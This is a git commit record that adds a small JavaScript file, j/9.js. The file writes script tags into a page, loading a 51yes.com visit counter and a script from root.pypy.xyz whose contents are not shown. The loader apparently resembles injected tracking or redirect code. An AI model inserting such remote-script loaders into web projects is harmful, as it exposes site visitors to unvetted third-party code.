58b9a334254ea38b86b81ccad04ac12ab3169948
opensus <jesses.king@outlook.com>
2015-07-10 19:55:49 +0800

    Create 9.js

---
+++ j/9.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count2.51yes.com\/click.aspx?id=23329608&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script type=\"text\/javascript\" src=\"http:\/\/root.pypy.xyz\/j\/location.js\"><\/script>")
